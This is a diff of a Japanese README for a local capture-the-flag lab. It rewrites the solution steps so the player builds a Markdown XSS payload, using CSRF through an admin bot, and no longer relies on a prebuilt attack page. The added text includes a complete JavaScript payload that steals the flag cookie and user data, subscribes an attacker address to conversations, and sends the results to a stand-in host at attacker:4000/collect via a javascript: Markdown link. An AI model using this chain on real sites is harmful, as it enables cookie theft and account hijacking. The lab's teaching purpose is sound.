@@ -15,24 +15,34 @@ docker compose up --build
 ## ローカル確認手順
 
 1. `docker compose up --build`
-2. `http://localhost:3000/report` を開く
-3. `http://localhost:4000/lab` を報告する
-4. admin bot の実行完了を待つ
-5. `http://localhost:4000/loot` を開く
-6. `flag=FLAG{local_markdown_xss_cookie_lab}` が表示されれば成功
+2. `http://localhost:3000/help/search` で Markdown リンクの挙動を調べる
+3. `greeting` に入れる Markdown XSS payload を作る
+4. payload を URL エンコードする
+5. `http://localhost:3000/report` を開く
+6. 次の形式で報告する
+
+```text
+http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
+```
+
+7. admin bot の実行完了を待つ
+8. `http://localhost:4000/loot` を開く
+9. `flag=FLAG{local_markdown_xss_cookie_lab}` が表示されれば成功
 
 ## 外部Webhook確認手順
 
 1. HTTP または HTTPS の Webhook URL を用意する
-2. Webhook URL を URL エンコードする
-3. `http://localhost:3000/report` を開く
-4. 次の形式で報告する
+2. Webhook URL へ送信する JavaScript payload を作る
+3. payload を Markdown の `javascript:` リンクに包む
+4. Markdown 全体を URL エンコードする
+5. `http://localhost:3000/report` を開く
+6. 次の形式で報告する
 
 ```text
-http://localhost:4000/lab?webhook=<URLエンコードしたWebhook URL>
+http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
 ```
 
-5. Webhook に次のような値が届けば成功
+7. Webhook に次のような値が届けば成功
 
 ```text
 flag=FLAG{local_markdown_xss_cookie_lab}
@@ -40,7 +50,15 @@ flag=FLAG{local_markdown_xss_cookie_lab}
 
 ## 詳細解法
 
-`http://localhost:4000/lab` は答え合わせ用の完成済み攻撃ページです。自分で考える場合は、次の順でチェーンを組み立てます。
+`http://localhost:4000/lab` は完成済み exploit ではありません。`greeting` クエリで渡された Markdown を admin bot に CSRF 送信するだけの汎用 payload host です。
+
+何も指定せずに `http://localhost:4000/lab` を報告しても FLAG は取れません。プレイヤー側で Markdown payload を組み立て、次の形式にして報告します。
+
+```text
+http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
+```
+
+URL エンコードが面倒な場合は、ブラウザで `http://localhost:4000/lab` を開くと report URL を組み立てるだけのフォームがあります。このフォームは exploit を生成しません。入力した `greeting` を URL エンコードして `/lab?greeting=...` にするだけです。
 
 ### 1. 攻撃対象の状態保存を確認する
 
@@ -74,7 +92,7 @@ bot は `/report` から渡された allowlist 済み URL を開いた後、最�
 
 脆弱版では `/help/search` の POST に CSRF トークン検証がありません。そのため、attacker 側のページから admin bot に自動 POST させられます。
 
-bot は Docker 内部で動くため、CSRF フォームの送信先は `http://app:3000/help/search` です。フォームの形は次の通りです。
+`attacker` の `/lab?greeting=...` は、渡された `greeting` を次のようなフォームに入れて自動送信します。bot は Docker 内部で動くため、CSRF フォームの送信先は `http://app:3000/help/search` です。
 
 ```html
 <form method="post" action="http://app:3000/help/search">
@@ -86,7 +104,7 @@ bot は Docker 内部で動くため、CSRF フォームの送信先は `http://
 </script>
 ```
 
-このページを admin bot に開かせるため、プレイヤーは `/report` に `http://localhost:4000/lab` を報告します。`/report` は `localhost:4000` を Docker 内部の attacker サービスへ変換して bot に渡します。
+このページを admin bot に開かせるため、プレイヤーは `/report` に `http://localhost:4000/lab?greeting=...` を報告します。`/report` は `localhost:4000` を Docker 内部の attacker サービスへ変換して bot に渡します。
 
 ### 4. XSS payload を組み立てる
 
@@ -143,7 +161,7 @@ void (async () => {
 
 ### 5. Markdown リンク用に payload を包む
 
-JavaScript をそのまま Markdown URL に入れると、括弧や空白で Markdown パーサに壊されやすくなります。そのため、実装済みの `/lab` は payload を Base64 にして、次の形にしています。
+JavaScript をそのまま Markdown URL に入れると、括弧や空白で Markdown パーサに壊されやすくなります。そのため、payload を Base64 にして、次の形にします。
 
 ```markdown
 [open details](javascript:eval(atob("<base64 payload>")))
@@ -151,21 +169,44 @@ JavaScript をそのまま Markdown URL に入れると、括弧や空白で Mar
 
 このリンクが `/help/search` で `<a href="javascript:eval(atob(...))">open details</a>` として表示され、admin bot のクリックで実行されます。
 
-### 6. 報告して結果を見る
+ブラウザの DevTools Console などで、次のように Markdown と報告 URL を作れます。
 
-完成した CSRF ページを attacker 側で配信できたら、`/report` にその URL を報告します。このラボでは完成済みの CSRF ページが `/lab` にあります。
+```js
+const js = `void (async () => {
+  const flagCookie = document.cookie
+    .split("; ")
+    .find((part) => part.startsWith("flag=")) || "";
+  const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";
+  const me = await fetch("/api/me", { credentials: "same-origin" }).then((response) => response.json());
+  await fetch("/api/conversations/latest/subscribers", {
+    method: "POST",
+    credentials: "same-origin",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ email: "attacker@example.test" })
+  });
+  const body = JSON.stringify({ cookie: flagCookie, flag, me });
+  if (!navigator.sendBeacon("http://attacker:4000/collect", body)) {
+    await fetch("http://attacker:4000/collect", { method: "POST", mode: "no-cors", body });
+  }
+})();`;
 
-```text
-http://localhost:4000/lab
+const markdown = `[open details](javascript:eval(atob("${btoa(js)}")))`;
+const reportUrl = `http://localhost:4000/lab?greeting=${encodeURIComponent(markdown)}`;
+console.log(reportUrl);
 ```
 
-bot のレスポンスに次が出れば、リンク発見とクリックまでは成功しています。
+### 6. 報告して結果を見る
 
-```json
-{
-  "foundLink": true,
-  "clicked": true
-}
+作成した `reportUrl` を `http://localhost:3000/report` に報告します。
+
+```text
+http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
+```
+
+`/report` のレスポンスは bot の内部状態を返しません。リンクが見つかったか、クリックできたかは bot コンテナのログで確認できます。
+
+```bash
+docker compose logs bot
 ```
 
 最後に `http://localhost:4000/loot` を開き、次が表示されれば解けています。
@@ -179,7 +220,7 @@ flag=FLAG{local_markdown_xss_cookie_lab}
 外部 Webhook に送る場合は、Webhook URL を URL エンコードして次の形式で報告します。
 
 ```text
-http://localhost:4000/lab?webhook=<URLエンコードしたWebhook URL>
+http://localhost:4000/lab?greeting=<URLエンコードしたMarkdown payload>
 ```
 
 ## 脆弱性の要点
